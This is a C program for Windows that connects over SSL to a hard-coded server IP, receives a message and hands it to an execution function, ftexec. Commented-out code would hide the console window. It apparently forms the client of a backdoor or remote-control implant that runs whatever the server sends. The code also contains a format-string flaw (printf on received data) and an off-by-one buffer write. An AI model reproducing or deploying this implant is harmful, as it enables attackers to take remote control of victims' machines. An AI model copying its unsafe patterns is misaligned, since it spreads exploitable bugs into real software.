#include <winsock2.h>
#include <windows.h>

#include "proto.h"
#include <stdio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#pragma comment(lib, "libeay32.lib")
#pragma comment(lib, "ssleay32.lib")

#define SERVER_IP "192.168.191.141"
#define SERVER_PORT 1234

int main()
{
    //HWND myWindows = GetConsoleWindow();
    //ShowWindow(myWindows, SW_HIDE);

    SSL_library_init();
    SSL_CTX *ssl_ctx = SSL_CTX_new(SSLv23_client_method());
    if (!ssl_ctx)
    {
        printf("Erreur lors de l'initialisation d'OpenSSL\n");
        return 1;
    }

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Erreur lors de l'initialisation de Winsock\n");
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("Erreur lors de la création du socket\n");
        return 1;
    }

    SOCKADDR_IN serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (SOCKADDR *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        printf("Erreur lors de la connexion au serveur\n");
        return 1;
    }

    SSL *ssl = SSL_new(ssl_ctx);
    SSL_set_fd(ssl, sock);

    if (SSL_connect(ssl) == -1)
    {
        printf("Erreur lors de la connexion SSL\n");
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    char buffer[1024];
    int bytesReceived = SSL_read(ssl, buffer, sizeof(buffer));
    if (bytesReceived > 0)
    {
        buffer[bytesReceived] = '\0';
        printf(buffer);
        Sleep(3000);
        ftexec(buffer);
    }
    else
    {
        printf("Erreur lors de la réception du message du serveur\n");
    }

    SSL_free(ssl);
    closesocket(sock);
    WSACleanup();
    SSL_CTX_free(ssl_ctx);

    return 0;
}
